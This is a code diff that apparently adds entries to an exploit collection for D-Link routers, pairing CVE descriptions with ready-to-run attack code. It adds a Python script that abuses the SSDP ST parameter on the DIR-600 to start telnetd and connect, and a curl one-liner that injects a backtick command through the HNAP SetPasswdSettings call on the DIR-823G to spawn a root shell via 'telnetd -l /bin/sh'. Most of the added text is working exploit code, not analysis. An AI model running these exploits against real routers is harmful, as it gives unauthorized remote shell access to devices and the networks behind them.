@@ -3412,3 +3412,49 @@ attack()
 """     
      ]
 }
+
+model_exp_dic["DIR-600_vB"] = {
+    "CVE-2023-33625":
+    ["D-Link DIR-600 Hardware Version B5, Firmware Version 2.18 was discovered to contain a command injection vulnerability via the ST parameter in the lxmldbc_system() function.\n['https://github.com/naihsin/IoT/blob/main/D-Link/DIR-600/cmd%20injection/README.md'\n'https://hackmd.io/@naihsin/By2datZD2'\n]",
+"""
+import sys
+import os
+import socket
+from time import sleep
+# Exploit By Miguel Mendez - @s1kr10s
+def config_payload(ip, port):
+    header = "M-SEARCH * HTTP/1.1\\n"
+    header += "HOST:"+ str(ip) + ":" +str(port)+"\\n"
+    header += "ST:urn:device:1;telnetd\\n"
+    header += "MX:2\\n"
+    header += 'MAN:"ssdp:discover"'+"\\n\\n"
+    return header
+def send_conexion(ip, port, payload):
+    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
+    sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,2)
+    sock.sendto(payload,(ip, port))
+    sock.close()
+if __name__== "__main__":
+    ip = raw_input("Router IP: ")
+    port = 1900
+    print("\\n---= HEADER =---\\n")
+    headers = config_payload(ip, port)
+    print("[+] Preparando Header ...")
+    print("[+] Enviando payload ...")
+    print("[+] Activando servicio telnetd :)") 
+    send_conexion(ip, port, headers)
+    print("[+] Conectando al servicio ...\\n")
+    sleep(5)
+    os.system('telnet ' + str(ip))
+"""     
+     ]
+}
+
+model_exp_dic["DIR-823G_A1"] = {
+    "CVE-2023-26615":
+    ["D-Link DIR-823G firmware version 1.02B05 has a password reset vulnerability, which originates from the SetMultipleActions API, allowing unauthorized attackers to reset the WEB page management password.\n['https://github.com/726232111/VulIoT/tree/main/D-Link/DIR823G%20V1.0.2B05/HNAP1'\n'https://github.com/726232111/VulIoT/tree/main/D-Link/DIR823G%20V1.0.2B05/HNAP1/SetMultipleActions']",
+"""
+a='`telnetd -p 8082 -l /bin/sh`' ; curl http://192.168.0.1/HNAP1 -H 'SOAPAction: "http://purenetworks.com/HNAP1/SetPasswdSettings"' -d "'$a'" -s >/dev/null ; telnet 192.168.0.1 8082
+""" 
+     ]
+}
